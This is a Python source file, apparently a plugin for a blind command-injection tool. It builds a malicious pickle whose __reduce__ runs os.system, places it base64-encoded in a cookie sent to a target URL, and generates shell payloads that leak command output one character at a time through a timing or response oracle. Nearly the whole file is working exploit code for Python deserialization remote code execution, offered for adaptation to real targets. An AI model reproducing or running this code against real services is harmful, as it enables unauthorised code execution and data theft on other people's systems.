import os
import pickle
import base64
import requests
from strategies.abstract_strategy import AbstractStrategy

class DeserializationPythonRCE(object):
    def __init__(self, cmd):
        self.cmd = cmd
    
    def __reduce__(self):
        return (os.system, (self.cmd,))

class PickleRCEStrategy(AbstractStrategy):
    def __init__(self, url="http://localhost/"):
        self.url = url
        
    def send_payload(self, payload, timeout=10):
        try:
            payload_dict = {"vuln_field": DeserializationPythonRCE(payload)}
            pickled_payload = pickle.dumps(payload_dict, protocol=0)
            payload_b64 = base64.b64encode(pickled_payload)
            
            cookies = {"vuln_cookie": payload_b64.decode()}
            response = requests.get(self.url, cookies=cookies, timeout=timeout)
            response.raise_for_status() # Comment this if it always returns something else than 200 or if false state returns something else than 200
            # Example time-based oracle. Don't forget to add sleep in your payload with the timeout value
            return response.elapsed.total_seconds() <= timeout
            # Exemple search for a specific error message in the response text
            return "SPECIFIC ERROR MESSAGE" not in response.text # or return "SPECIFIC SUCCESS MESSAGE" in response.text
            # Exemple parse specific output, eg. if the backend replies something like "Hi Mister 0! This is the output code: 0. Good luck haha!"
            return response.text.split("This is the output code:")[0].split(".")[0] == "0" 
            # If the backend returns a 200 status code when there is no error
            return response.status_code == 200
        except Exception:
            return None
    
    def create_length_check_payload(self, cmd, length):
        return f"t=$({cmd}|base64|tr -d '\n'); [ ${{#t}} -ge {length} ] || mismatch"
    
    def create_char_check_payload(self, cmd, position, char_value):
        return f'echo "$({cmd}|base64|tr -d \'\n\')"|cut -c{position+1}|od -An -tuC -N1|tr -d " "|xargs -I{{}} expr {{}} "=" {char_value}||mismatch'
    
    def create_char_less_than_payload(self, cmd, position, char_value):
        return f'echo "$({cmd}|base64|tr -d \'\n\')"|cut -c{position+1}|od -An -tuC -N1|tr -d " "|xargs -I{{}} expr {{}} "<" {char_value}||mismatch'